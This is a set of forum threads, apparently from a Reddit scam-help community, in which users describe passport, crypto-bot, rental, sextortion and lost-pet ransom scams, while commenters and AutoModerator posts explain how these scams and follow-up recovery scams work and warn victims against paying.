- > pretending to be from a law firm that is working with this scam case and wants to help me ...

!recovery
- How do you know this "friend" ?
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: Someone in my family fell for the passport scam
Body: So long story short, heres how the scam goes:  


An person impersonating as Indian police, called someone in my family and told them that their password has been compromised, and that someone tried opening bank accounts, launder money and travel with it. This person, was supposedly stopped at the airport trying to leave the country. Coincidentally enough (actually not so coincidental) the person in my family is also from India but lives in another country. What was even more convincing was that this person in my family has actually managed to lose their passport a long time ago in India while traveling. They quickly made a new one after returning to their home country. However, i believe that they carefully select people they know who lost their passports.

At first, hearing this for the first time, i actually believed it to be real too. Ofcourse, i asked more questions, and that was when it all became clear.

This person in my family isnt the brightest, and hopped on a videocall with the "indian police" via Whatsapp. They then asked him to show his passport, which he did, and they definetly screenshotted that shit. There are lots of details too this, and i can gurantee you guys this is a scam. 

So they have a picture of his passport, which has biometrics, so idk what they want to do with it. Usually its not possible to do anything with biometric passports. ut it being India, they can definetly use that in ways you couldnt in western countries, like taking loans or credit cards.

So, do you guys have any smart ideas?

- They‚Äôll be using the passport to scam other people for other scams. Nothing you can do about that. 

I hope your family member is suitably chastised and maybe wi learn something. Keep an eye out for people to contact them when the stolen passport info is actually used as an identity.

Oh and please be courteous and delete the other 2 duplicate posts.
- In what ways can they possibly use it?

Yes, but i dont believe it can be used. The first thing the family member will do is get a new passport, and then inform indian authorities and banks.

- It's a !muse scam. Don't entertain message requests.
- Internet free money is never not a scam.
- No random artist will pay you 1000 just to draw you. Only scammers will do that.

Just remember that any random strangers who will offer you money out of nowhere are scammers.
- Yes, it‚Äôs a scam. Sadly.
- They send me an email that has a link to track the art and make a contract. I haven‚Äôt seen that in the other post. Is it still part of the scam?
- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Muse scam.

The muse scam is a variant of the [fake check scam](https://consumer.ftc.gov/articles/how-spot-avoid-report-fake-check-scams) in which the scammer will contact the victim over social media and claim to want to use their image for an art project. The scammer will often use a stolen social media account to increase their credibility. They will offer a generous sum of money and offer to pay via check, and the victim is instructed to send money to the scammer for ‚Äúmaterials‚Äù via an irreversible method. The victim is under the illusion that the funds cleared when the bank makes the money available thanks to current regulations. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months.

If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. You can summon the fake check automoderator explanation using the trigger fakecheck. Thanks to redditor aNeatHat for this script.

This is a scam where a scammer impersonates an artist. For the scam where a scammer targets artists, call the automoderator trigger (artist)


**
- It's there so you ask yourself "but what if it's real". Still a scam.
- > They send me an email that has a link to track the art and make a contract

So they set up a website that is designed to make you think that it's tracking something.  Anyone can create a website that says whatever they want it to say.

And contracts are only useful when you can take someone to court for breach of contract, and that requires you to know who they are, and for them to be in the same country as you.  Some dude in Cambodia or Nigeria is not beholden to your country's laws, and doesn't give a crap about contracts.  They'll sign a contract that says whatever they think will part you from your money, because they know that they don't have to do what the contract says, and there's nothing you can do about it.
- It's all part of the scam, just like when you get emails from someone telling you they will get your money back that you're about to lose back for you, it's the same scam.

  

!recovery - Recovery scams
- Yes.
- Hi /u/Not-a-Cranky-Panda, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: Solmore.xyz is a scam stay away
Body: I ve been fooled by their facebook group Millionaires inner circle. First they make you buy SOL to put in the deployment of a bot that will generate money from trading with your SOL, sending you notifications respectively in the Telegram APP and in the dApp of the website of evey transaction. Everything seemed so high end and extremely well made i haven t really waited long before jumping in to create my first bot, they helped me and everything was set up. I had actually withdrawn around 400$ before the bot stopped after a few days, they say it s because I changed settings \*even if not\* , AND some other gaslighting bs. They say they don t have access to my account and cannot help, banned me from group and their profiles. I know at least two people who got their accounts with all their funds and profits from the bot taken away leaving the account to zero. Since I haven t found anything about this scam online and even if i tried to report the group fb said there s nothing wrong with it I bet i m not the only one been scammed by this. Please let your voice heard

- Anything.xyz is a scam. Anything on Telegram is a scam. All financial groups on social media are scams.
- "Generate money" from what, thin air?
- >First they make you buy SOL¬†

Since they didn't actually 'make you,' which would mean forced you to - wouldn't 'they trick you' be a better way to say what happened?
- > generate money

The moment you thought this was possible was the moment you doomed yourself to be scammed. Easy money is always a scam. When you try to do the impossible, you will be scammed. When you put greed before common sense, you will be scammed. Tale as old as time. People falling for get rich schemes is as old as money itself, even the Bible warns about it.
- Dude

There is no such thing as generating money. Or making easy money guaranteed. Where does the money come from? 

If such a method exist why would they create a millionaires circle to being random internet strangers rich instead of just simply using it to make themselves rich?
- You all are right ! But seriously there was no reason to be this mean to someone you don‚Äôt even know. Fortunately someone made a few thing clear that are not clear for everyone because not everyone is at your level of comprehension of this specific subject and don t know he s not until he finds out the hard way. A lot of you might have critical thinking and are very smart but have no grace in life.
- !whois solmore.xyz
- xyz domain, telegram... of course it's a scam.

These scams are a dime a dozen. Announcing one is a scam is nice, but not particularly helpful. There's going to be a dozen more popping up by the time this one is well-known enough to scare people off. Instead, look at the obvious tells. The domain name. The age of the domain in a whois search. The use of telegram. The unrealistic promise of a bot generating money for nothing. 

The last one is particularly egregious. If a group had a legitimate bot/AI that could figure out a sure-fire method to make money, they'd be using it, not giving it out for others to use. The conclusion is obvious: they are using it to make money \*from the suckers lured in\*.
- Thank-you for posting, hopefully it will help someone else. I am sorry that you lost money, it's a rough way to learn a lesson. This scam is new to you, but it is a common scam. There is a new twist: I haven't seen the (fake) AI bot before.

You know now that it's a scam, but I am concerned that you dont yet grasp the depth of the scam. You need to understand the total scam, so you don't get scammed again.

**It was a scam from the beginning. There was never any investment.** 

Everything was fake. The wallet is fake, the AI bot is fake, the website is fake. People in the FB group are mostly liars; anyone who says they made money this way is a shill, working with the scammers. 

You never made any money. You gave money to scammers. **The screens they showed you with money earned were made up.** The whole thing was set up from the beginning to take your money.

**No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or FB or  through a "random" text message.** No legit company forces you to pay a "fee" or "taxes" to withdraw money. That's just a scam to take more money from you.

So you got scammed, it happens to everyone, there's no shame in that. But you need to educate yourself, to make yourself more scam-proof. If you want to invest, find a legitimate online brokerage in your country, or read about how investing works. Don't put your trust in internet financial gurus, they are all liars, every single one. And check out other stories on this sub, to get more familiar with scams, so that you recognize the signs.

This domain name was first registered only 6 months ago (Jul 2024) and it was only registered for a single year (Expires: Jul 2025).

Everyone that got more useful insights please share
- You mean !crypto
- Its because this reddit sees this same scam over and over. The name of the scammer doesnt matter, because next week theyll be using a different name.


The lesson is theres no "get rich quick method" on the internet.
- You'll get that here. Just consider the losses as a lesson learned and move on. And stay very far away from Telegram, absolutely nothing good happens on there
- There is nothing you can do. You cannot get your money back. Hope you learned your lesson when it comes to get rich quick schemes.
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Thanks üôè, my mistake!
- yes i do, and never before fell for anything,but a specific thread on reddit would have helped me in make a better decision, that s all.
- These scams are posted multiple times a day in this subreddit. All the information you needed was there.
- Reddit (hopefully) can't read your mind and conjure up useful posts without you using the search.
- There are thousands of these groups and platforms out there with different names. The thing to understand is that all of these investment groups that promise to make you big money are all scams.

If anyone had some easy and free way to make guaranteed money, they wouldn't be sharing it with randos on the internet.

You bought crypto and sent it directly to the wallet of the scammers who live far far away. You can't get it back and no one else can get it back for you.
- Dude, the names of the apps and websites change every couple of weeks because they get burnt, but there are endless posts here talking about becoming a millionaire with some sketchy crypto scheme found on social media, with communication over Telegram or WhatsApp groups.

You don‚Äôt need to be spoon-fed the info, you need to get some critical thinking skills.
- I ve seen nothing similar to this regarding a bot connected to my own wallet just people asking money from you to send to their account so they can invest it and then when they said your 150$ became 6000$ ask you to pay an amount to unblock them.
- I would by the way.
- This is different because the money went to the wallet i created for this purpose
- This hasn t changed since months and got loads of people on the fb group.
- Search this sub for crypto. It
- You "created a wallet" on a scam website, feeding money directly into the scammers' wallets.

Please don‚Äôt engage in trading that you don‚Äôt fully understand. Stick to index funds if you want the greatest chance of coming out ahead, and don‚Äôt invest money you can‚Äôt afford to lose.
- Wow, months?

The brokerage I use to invest with was founded in 1871. 

Lifespans of legitimate investment firms are measured in decades. Not months.
- It was created 6 months ago. If that‚Äôs not a red flag, I don‚Äôt know what to tell you. Get a smarter person help you manage your finances, because everyone is telling you the same and you keep fighting the advice.
- Thank you

Title: think i got scammed on Craigslist, but not sure? please help!
Body: I responded to a Craigslist ad for a sublease / short term rental - the post looked legit. Descriptions of a building in the city I'm looking in, including things nearby / in the building that I confirmed on Google Maps. It was well-written and had lots of photos. Seller asked for some information in the response email - mainly when I was looking to move in, pets, etc. Also asked for my phone number and said that they would call me. I responded to the post via email, and they texted me asking to call in the next ten minutes. I said 'Sure'. Thirty mins go by with no call. I ask if they still plan to call, they say yes, and then a little while later do. When I pick up the phone, the guy sounds southern (area code for the phone number was Dallas, I looked it up), asks how I am, and then says, 'so you're looking to move?' I say, 'yes, I'm looking for a short term rental'. He hangs up. I tried to call back, but it said the number was no longer in service. I blocked him and flagged the post. I'm not super experienced with Craigslist and am not sure what he could do with my email and phone number if it was a scam. Also, scared he maybe just wanted to record my voice? Any thoughts or advice are appreciated!

- Nothing, you're fine, that info is likely available online for anyone who really wants it anyway. He can't do anything with a recording of your voice. Chill.
- sounds like they just found someone else, or didn't like the sound of you - not very nice behaviour, but whatever.
- It was a scam, but you didn't give him anything dangerous. 

From what I've seen on this sub, rental scams are all over Craigslist, FB Marketplace, and other such sites. Never give anyone money until you've seen the place in person and have a signed lease that you know is legitimate. Do as much as possible in person. If it looks like you're being shown a place that isn't actually for rent, talk to the neighbors. 

Also, do a reverse search to see if the listing simply pulled content from a site such as Zillow. Apparently homes that are for sale get used for the rental scam.
- yeah... i went down an ai voice cloning rabbit hole and freaked myself out. thanks for your response!
- You're welcome. I'm not an AI expert or anything but as far as I understand it, current technology needs \~30 seconds straight of you talking to clone your voice with AI. If you said one sentence and hung up it's not enough to get an accurate clone of your voice. There's also fewer uses for a clone of your voice than people think.
- I'm an expert in the field. I can assure you 4-5 seconds is more than enough to get a passing resemblence. Especially for using on the phone where people naturally expect lower quality audio.
- I don't think saying "yes, I'm looking for a short term rental" takes 4-5 seconds unless you talk very slowly.
- I just read the post. I'm certain he said more than that. He says the caller asked how he's doing. Even if not, it's still ok. send me 3 seconds long audio of yourself or someone random and I'll prove it to you

You know now that it's a scam, but i am concerned that you don't yet grasp the depth of the scam. You need to understand the total scam, so you don't get scammed again.

**It was a scam from the beginning. There was never any job.** 

Everything was fake. The tasks you did were fake, to make you think you were doing something of value.

You never made any money. You gave money to scammers. **The screens they showed you with money earned were made up. It was all lies.** You gave them money, and they gave you back a little bit to make you think that they would actually pay you. But the whole thing was set up from the beginning to take your money.
 
Everyone gets scammed, there's no shame in that. **But you need to learn more, to see red flags before someone else scams you.** They will try, but you can scam-proof yourself.

Browse or search through r/scams, you will see that many people fall for job scams and lose money. Sometimes they lose all their savings, have their bank accoint closed for fraud.

- Hi /u/c1884896, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Hi /u/wizard-of-loneliness, AutoModerator has been summoned to explain the Pig butchering scam.

It is called [pig butchering](https://www.forbes.com/sites/jasonbrett/2023/12/26/new-pig-butchering-crypto-scam-includes-victims-in-us-and-overseas/?sh=2837fb975eaa) because scammers use intricate scripts to \"fatten up\" the victim (gaining their trust over days, weeks or months) before the \"slaughter\" (taking them for all of their money). This scam often starts with what appears to be a harmless wrong number text or message. When the victim responds to say it is the wrong number, the scammer tries to start a friendship with the victim. These conversations can be platonic or romantic in nature, but they all have the same goal- to gain the trust of the victim in order to get them ready for the crypto scam they have planned.

The scammer often claims to be wealthy and/or to have a wealthy family member who got wealthy investing, often in crypto currency. The victim is eventually encouraged to try out a (fake) crypto currency investment website, which will appear to show that they are earning a lot of money on their initial investment. The scammer may even encourage the victim to attempt a withdrawal that does go through, further convincing the victim that everything is legit. The victim is then pressured to invest significantly more money, even their entire net worth. Sometimes pig butchering scams don't involve crypto, but other means of sending money (like bank wires, gift cards or even cash pickups).

Eventually, the scammer will find an excuse why the account is frozen (e.g. for fraud, because supposed taxes are owed, etc) and may try to further extort the victim to give them even more money in order to gain access to the funds. By this time, the victim will never gain access and their money is gone. Many victims lose tens of thousands, hundreds of thousands, or even millions of dollars. Often, the scammers themselves are [victims of human trafficking](https://www.vice.com/en/article/n7zb5d/pig-butchering-scam-cambodia-trafficking), performing these scams under threats of violence. If you are caught up in this scam, it is important that you do not send any more money for any reason, and contact law enforcement to report it. Thanks to user Mediocre_Airport_576 for this script.

Title: A weird Telegram scammer
Body: So I was sexting with a person which I thought was real. We both consented sending each other our private parts on telegram. Then a few minutes later they made a photo edit on photo grid app with my junk that looked similar to a Facebook post and Twitter post. And they demanded me to purchase them some things that I started questioning if this little brat is foreal. Because usually most scammers would go for three digit or higher but for this one he just wanted an $20 Xbox razer gold. So I pretty much just block that person deleted telegram and changed every profile username and made all my accounts private. 

Pretty much worried if it's real and please let me know if I'm good.

Also if this isn't making sense note that it all coming out of my head because I'm panicking and worried.

- Pretty common !sextortion scam.

I doubt they will send your pictures to anyone because that doesn't earn them any money.  If they are smart they will concentrate on looking for the next victim to scam.
- Honest question. I‚Äôm. perplexed and I mean no disrespect. What made you think this was a good idea?
- Don't engage with scammers.   Delete the messages and block the sender.

There's no way to be 100 percent sure what a scammer will or won't do with your picture, and that's true whether you pay them or not.  In fact, if you do pay them, you'll only show that you can be coerced, so the scammer will return to you often to demand more.
- Good call!! Just bc they started with a  lowball ask, that  doesn't mean it wouldn't have  escalated quickly. You have done all you can. Be prepared for more scammers to bombard you. Just keep deleting and blocking. And in the future, keep your junk private, right?
- For future reference, nobody wants to see your private parts, not even some girl you just met on Tinder or something similar. It's just how the world works
- so the scammer is threatening to post genital photos that would get their account banned ?

would block and ignore and stop sending nudes to random blokes, it is a bit like walking down the street and pulling your pants down, why do the same online ?

if you meet a girl outside, no need to send them the same
- My boyfriend did this "thinking it was a "beautiful woman" and a dare from his idiot friend üôÑ

Scammer threaten he pay for it or everyone will know

Scammer did message me his "photo"

And boyfriend was in DEEP trouble with me...

I still remind him how stupid he is that he sent a photo of his  "goods" to another man in another country.....

He goes "shameful dog face" every time..
- Hi /u/Smooth_Security4607, AutoModerator has been summoned to explain the Sextortion scam.

This scam occurs when you meet a woman/man on dating service/social media site/forum/wherever and they ask you to go on Skype, WhatsApp, Telegram, or another messaging system. They will ask you to exchange naked pictures, and they will usually ask you to include your face in the pictures. They will then threaten to reveal the pictures to your family/friends if you do not pay them. The best thing to do in this situation is block the scammer and go private in your socials for a while. Paying the scammer will not make them back off, and just tells them that it is worth their time to continue threatening you.

If you fell for this scam, we recommend you join the sextortion subreddit and follow the recommendations of their sticky post: https://www.reddit.com/r/Sextortion/comments/n4yorq/new_victims_please_read_first/

Also beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the photos or get back at the extorter. They can't, it's a trick to make you lose more money.


**
- Here the thing I feel like they'll most likely get banned or warning for posting the junk on social media
- Scammer sent it to me his wife!
- My boyfriend did it because he was dared to by his dumb friend and when I received his "lovely picture" of it from the scammer I was Absolutely INFURIATED with him and told him he was stupid sending photos to people he didn't know and told him men in another country are laughing at you for thinking a "beautiful woman" you have never met wants to see your pee pee?!"

HA!!!
- Honestly I don't know man most like desperate but I definitely know to not do this hit ever again and keep my shit in my pants
- Definitely deleted that app
- Yep definitely
- This.  They started low just to try and break down that first barrier to committing money, then it would've escalated.

OP: Good work in shutting this down early. A relatively free lesson in why sending nudes is never a good idea
- Your boyfriend doesn't seem as committed to the relationship as you. üö©üö©üö©üö©üö©üö©
- They won't waste their time when there is money to be made looking for other victims.
- Yeah‚Ä¶he was dared‚Ä¶totally‚Ä¶
- I‚Äôm sorry this happened and I hope everything works out for you!
- I wouldn't trust anyone in messages unless you 100% know them...

I received the same thing and blocked it with no response from me to them....

I remember my boyfriend falling for this and he was in hot boiling water with me....

So I remember him saying something about a video of a woman and she wanted his photo and then the scammer sent it to me showing me what he was up to that day while I was at work thinking everything was fine....

Then scammer wanted money or it be sent out to everyone he knew...

He said he was going to pay them

I said have you lost your mind what SANE person you know that's a complete stranger wants pictures of you and then money to keep quiet?

Idk if I was the only person who received the message or not but I do know they can and will send it to at least someone you know...

And that is scary to think about..

Go down the rabbit hole and it's petrifying they don't know who they are messaging with can be "ANYONE" if you know what I mean without actually saying it...

Chin up though you learned something if nothing else and you are not the first and will not be the last....
- ü§£ü§£ü§£ü§£ü§£ 

Idk I was at work when all this went down...

I wasn't very happy with him that's for sure!!

Pee pee photos from scammers REALLY ticked me off that day...

I wasn't hearing anything about his "excuses" that day....

I don't think he had a whole word in the conversation until I finally calmed down...

I remember the scammer messaging me was the first thing I saw and I called him immediately losing my everlasting mind on him....

Then I saw all his "apologies" "warning" blah blah blah messages..

Took him a week to convince me that I wanted to continue such a relationship with him...

We really were not dating long when he pulled this stunt....

Almost 5 years now some days though whew!! Being the brain of the relationship is very exhausting...

He just doesn't use his...

I admit he has proven better now than at the beginning of the relationship....

It's hilarious now but definitely not back then...

You look at your phone and the first thing you see after clocking out is a "pee pee" pic of your boyfriend from a complete stranger..

Yeah it didn't end well for him
- Thank you üôè I appreciate it much love
- If only I think twice before doing something I'll regret but luckily I didn't pay them anything and I wasn't planning on doing it
- You‚Äôre not still believing this ‚ÄúI was dared‚Äù thing are you? I always think a dumb lie is worse than the truth. Does he often piss on your head and tell you it‚Äôs raining (metaphorically)? Sounds exhausting.

Title: Scammers said they will euthanize my cat if I don't send them money
Body: About a week ago my family cat ran away (technically my sister's cat). I posted everywhere and we tagged the microchip as lost and haven't heard anything yet. 


Earlier today my sister (her husband first then her) gets a call from the number of our local animal shelter. Mind you, it's 11pm here and the shelter closes at 7pm. They are telling her they have her cat, she is seriously hurt and they had to call an emergency vet for surgery. Keep repeating that it's a recorded line. 

They say the surgery costs $2,500 and she needs to zelle them or venmo them and can't pay with her credit card "because it has to be a donation since we are a shelter." My sister, not having talked to me yet, tells them she doesn't have that much, they said they'll call her back. 

Soon they call her back to tell her that fine, they can do the surgery for $1,200, they talked to the vet. She asks them for pictures and they say they can't send them, cat is in that bad a condition and they're on a landline. She says she'll call them back and they insist they have to be the ones to call since the shelter is technically closed, it will go to voicemail. 

Eventually they say that if she doesn't send the money right away, they have the vet's order to euthanize her cat. 

We checked with microchip issuer and the cat is still "lost" in their system btw.

 Now my question is, I'm the one who posted their pet with my info, how did they even get my sister's and her husband's numbers? They also sent them emails. She is worried sick that this wasn't a scam and she's responsible for her cat dying, and I'm the one who had to convince her it was a scam but I want to make sure 100%. 

(Sorry about format I'm on mobile)

**
- It's clearly a scam as they force you to pay it as soon as possible and threatening with killing it. That credit card stuff is bs too..
- No respectable bussiness would ever approach you like this.
They got your number of a poster and are trying to scam you.
- Tell them you will go to the shelter since they are there and hand them cash. Watch them make an excuse why that is not possible.
- > They say the surgery costs $2,500 and she needs to zelle them or venmo them and can't pay with her credit card "because it has to be a donation since we are a shelter."

Any reputable place would rather have credit cards or cash than some weird cash app, especially when it comes to donations. (And, yes, I use credit cards for donations without any problems.)

***Definitely a scam!***

If you look up the number for your local animal shelter and call them directly, they can say whether or not they had called with the emergency vet bill.

Remember, scammers can spoof any number on caller-id. Just a few weeks ago, for example, scammers called my wife, spoofing the phone number of the local district attorney's office, claiming she owed bail money or she would be jailed until she would be brought before a judge for failure to report to jury duty after signing for a subpoena to appear for jury duty. (It was all a scam.)
- Some from my city the Nextdoor platform was targeted by this earlier today.  They're looking at social media posts of lost pets and engineering a plan of attack.  It really makes no sense because this one wasn't even chipped, and it's not like workers at an animal shelter have nothing better to do than scroll through random Facebook posts looking for a match to such and such a cat.  


https://preview.redd.it/h46pqbp3vwee1.jpeg?width=1744&format=pjpg&auto=webp&s=6a663ff07a0376c28d4e5e516cbe844bb93850b0
- Here's how they do it:

* First, they don't have the cat. Any vet, animal hospital or shelter would scan for a chip *first*, since that identifies the animal and the owner.
* You put your name on the flyers. But all you need to do is a search on Google for your name and number. Many of the "people finder" sites have your public information, and they frequently include the names of relatives, and a search on those can reveal emails and phone numbers. 
* The whole scenario taking place after hours is also a big ruse to get you to act immediately. No shelter, vet or animal hospital is going to call you after hours, not let you call back and then demand immediate payment for a single cat.

This is just another way scammers have used people's emotions and fear to extract money from them. Don't fall for it. There is nothing logical or reasonable about any of their "requests."
- This is, unfortunately, a relatively common lost pet scam. I work at a shelter and we've had a number of people report this to us, but there's nothing we can do about it since the scammers are spoofing our number. We put it a PSA about the scam on Facebook but that's really all we can do.¬†


It's also extremely easy to find people's emails and phone numbers if you know their full name. I also have to do that every day at work while trying to track down people who never updated their pet's microchip. Your contact info is not confidential.



It should also be pretty obvious that an animal shelter is not going to ask you to Cashapp money to them, though. Dead giveaway that it's a scam.
- Phone the shelter from a number you've looked up separately  online and ask.

If they didn't tell you which shelter, that's very suss. 

This definitely sounds like a scam. The fact there's pressure and they are trying to rush you.
- It‚Äôs a scam and a particularly cruel one at that. The excuse about not being able to send photos is because the scammers don‚Äôt have the cat at all. And no reputable shelter is just going to euthanise an animal if the owner doesn‚Äôt pay immediately. I, so sorry you and your sister are going through this, please do not send any money at all. Block and ignore them.
- As a cat owner, this makes me sick. 

It‚Äôs 100% a scam because the *vet* would be contacting her, not the shelter. She would then be asked to come to the clinic, and they would deal with it there. The phone call would be to get her consent to proceed and discuss the cat‚Äôs condition.
- The scammers are getting so horrible!  It‚Äôs a spoofed phone number.  They don‚Äôt have the cat.  If you call the actual shelter?  They‚Äôll have no record of that cat there.
- What a nasty, cruel scam. I'm so sorry.

Of course your sister is upset about this. You said the animal shelter is local to you. Would it be possible for your sister to drive by the shelter? She could confirm that they are indeed closed and her cat really isn't there. It might convince her that this is indeed a scam.
- Even if microchipped, cats don't do as well being lost compared to dogs. Cats don't wander too far. If they come back, they were there all along, but otherwise, domestic cats who get outside in certain areas are easy pickings for cars in populated areas, or other animals to injure or even kill them in areas that are not. 

I could see lots of scammers being attracted to LOST PET ads because it's well known how attached Westerners can be to their pets. Where my son lives, by contrast, street cats are no more pets than a possum would be. People walk by skinny mewing kittens without a 2nd glance. When we adopted our kid from china, we were specifically told not to include family photos with pets because the Chinese don't see dogs and cats as pets the way we Americans do.

Just one more way to scam Americans. Americans looking for love, Americans looking to make a quick buck, your grandson who never contacts you is being held in Mexico, you need to send $$$ to get him free etc. Not even getting into how while the general education level in the US has been precipitously declining for decades, you now have random motorists who think they are constitutional scholars and housewives who sell essential oils being more knowledgable than people than people with an actual medical education. 

PS I have a son who lives in the middle east. I raised him with cats. Every single time he comes home he brings a street cat he has rehabbed and vetted. I've got 3 at this point.
- Ah the famous Scamdingers Cat experiment. The cat is neither dead nor alive because the cat doesn‚Äôt exist. It‚Äôs all a scam.
- How did they get to your sister, you ask?  Is your name on any ads/alerts re the lost cat?  They would look on social media for you, and  see your sister (perhaps she has the same family name as you, or they can see on your social media a reference to her being your sister) - and then perhaps her number is the only phone number they could find online (yours may not be listed or published online).

Otherwise, they may simply have rung random people about lost cats as part of a general scam, and your sister stupidly replied "Oh yes - my sister has lost hers!"
- Tell your sister to physically go to the shelter that matches the number they called from. If they‚Äôre truly there (allegedly about to operate on the cat), she can pay in person.
- I would bet that if you wrote back that you found your cat they‚Äôd still try to make an excuse to charge you somehow (don‚Äôt interact further with the scammers, though)

Sorry about the cat, hope it turns up.
- SCAM.

What a bunch of absolute shits these people are.

  
My commiserations to your sister, but please show her this and reassure her that they never even so much as saw her cat.
- It‚Äôs definitely a scam.
- The question OP posted was "Now my question is, I'm the one who posted their pet with my info, how did they even get my sister's and her husband's numbers?"

There are cheap microchip readers, though to that be the solution to OP's question, it would seem they have the cat.

OP, what information did you share in your postings about the cat?
- This scam is going around municipal animal shelters. It has happened to many people who frantically call the shelter where I volunteer. You can call, or go to the shelter directly and I'm 100% positive they don't have your cat.
- For future pet scamees, ask them about a unique identifying mark that doesn't exist. 

Like "do you see the dumbbell shaped scar on her paw" or some shit that isn't true and they'll say yes more than likely.
- These ghouls troll social media for missing animals. As long as you have one name or phone number, it is very easy to find out the names, addresses and phone numbers of family and friends. People post their entire lives on social media, it makes scamming people very easy.

Edit: Corrected autocorrect
- I volunteered as a shelter worker for seven years and my spouse is a veterinarian. This not how ANY shelter operates. It's a scam. Block and ignore.

Expect more scam attempts if your number is public. Lost pet scams are VERY common.
- Someone once stole my cat and called the number on her tag to demand a ransom. If you think this is possibly what's going on, call the police.

But more likely, they are scammers who don't have the cat and are just using your posted "lost" info.
- OP, there are other lost pet scams. You and your sister need to be aware of them. Now that they do have your sister's number, they may call her with a different scam -- they have her cat, but they want reward money before they hand over the cat, then you use some non-reversible app to  give them money but never get the cat.

I think there's an automod explanation of !pet scams.

Edit: that's not the automod I wanted, I am sorry, ignore it (that pet scams relates to buying a pet).
- Spoofed phone number. Total scam. They do not have your cat.
- It's  scam but if she's really worried, go to the shelter during their business hours. It's not hard to confirm. If they really have the cat, they will let her see the cat.
- I have made tons of donations (like through GoFundMe) using a credit card.

Tell your sister 100% scam.  Microchipping pets ins't a GPS system.  it is just so that they can identify the owner of the animal if they are found and turned in.  If it was GPS, the issuer would have found the cat already.
- Tell them you need a pic of the little white Y shape on the inside of its back leg. If they do you know they dont have the cat because it doesnt have one. They dont have the cat, but it keeps them busy trying to prove they do.
- Good thing they're scammers and don't actually have your cat.
- OP, here is a link to post of someone who lost her cat and was scammed for months by people claiming to have the cat, trying to get money from her.

Possible trigger warning: her cat never returned alive.

https://www.reddit.com/r/Scams/s/etrz0l9aHF
